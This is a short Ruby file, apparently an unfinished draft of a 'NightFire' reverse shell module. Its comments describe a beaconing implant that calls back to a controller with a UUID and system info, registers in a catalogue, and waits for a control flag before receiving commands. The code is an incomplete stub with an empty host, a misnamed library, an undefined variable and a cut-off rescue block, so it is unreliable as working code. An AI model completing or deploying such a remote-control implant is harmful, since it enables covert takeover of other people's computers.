# NightFire Reverse Shell Module

# Every X minutes shell should make reverse connection to IP address, with UUID and basic system info.
# NightFire server will listen and catalouge them. If UUID does not update every x+45 seconds, it is removed from catalogue
# Initial connection should contain UUID, and Basic system info.
# Initial server reply should be confirmation of UUID.
# Client RS closes connection and waits x time before retrying.
# If server reply is "yes" to control flag, initiate command recieving. 

require "socket"
require "secure_random"

HOST = "" # should accept domain and IP.
PORT = 80
UUID = SecureRandom.uuid
def open_socket()
	begin
		socket = TCPSocket.new(HOST, PORT)
		client << "hi there"
		response = socket.gets
	rescue
